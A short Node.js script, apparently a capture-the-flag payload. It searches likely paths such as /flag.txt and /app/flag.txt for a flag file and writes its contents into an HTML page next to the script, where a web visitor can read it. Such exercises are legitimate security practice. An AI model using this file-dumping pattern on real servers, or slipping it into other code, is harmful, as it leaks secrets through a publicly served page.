// grabflag_12345.js
const fs = require("fs");
const path = require("path");

function tryRead(p) {
  try { return fs.readFileSync(p, "utf8"); } catch { return null; }
}

const candidates = [
  "/flag.txt",
  "/opt/chal/flag.txt",
  "/app/flag.txt",
  path.join(process.cwd(), "flag.txt"),
  "flag.txt",
];

let flag = null;
for (const p of candidates) {
  flag = tryRead(p);
  if (flag) break;
}

if (!flag) flag = "FLAG NOT FOUND (tried: " + candidates.join(", ") + ")";

fs.writeFileSync(path.join(__dirname, "flag.html"), `<pre>${flag}</pre>`);
